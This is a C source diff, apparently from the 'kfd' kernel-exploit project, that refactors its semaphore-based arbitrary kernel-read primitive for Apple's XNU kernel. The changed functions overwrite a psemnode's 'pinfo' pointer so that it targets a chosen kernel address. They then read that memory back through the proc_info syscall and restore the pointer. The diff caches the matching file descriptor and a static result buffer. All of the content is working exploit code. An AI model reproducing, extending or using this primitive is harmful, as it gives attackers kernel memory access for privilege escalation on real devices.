@@ -9,6 +9,7 @@
 
 const char* kread_sem_open_name = "kfd-posix-semaphore";
 
+static int kread_fd = 0;
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
 u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);
 
@@ -76,6 +77,7 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
 
             if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                 kfd->kread.krkw_object_id = object_id;
+                kread_fd = fds[kfd->kread.krkw_object_id];
                 return true;
             }
         }
@@ -137,28 +139,25 @@ void kread_sem_open_free(struct kfd* kfd)
 /*
  * 64-bit kread function.
  */
-
+static struct psem_fdinfo psem_data = {};
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
 {
-    i32* fds = (i32*)(kfd->kread.krkw_method_data);
-    i32 kread_fd = fds[kfd->kread.krkw_object_id];
     u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
 
     u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
     u64 new_pinfo = kaddr - static_offsetof(pseminfo, psem_uid);
     static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);
 
-    struct psem_fdinfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDFDINFO;
     i32 pid = kfd->info.env.pid;
     u32 flavor = PROC_PIDFDPSEMINFO;
     u64 arg = kread_fd;
-    u64 buffer = (u64)(&data);
+    u64 buffer = (u64)(&psem_data);
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
     static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
-    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
+    return *(u64*)(&psem_data.pseminfo.psem_stat.vst_uid);
 }
 
 /*
@@ -168,8 +167,6 @@ u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
 
 u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
 {
-    i32* fds = (i32*)(kfd->kread.krkw_method_data);
-    i32 kread_fd = fds[kfd->kread.krkw_object_id];
     u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
 
     u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
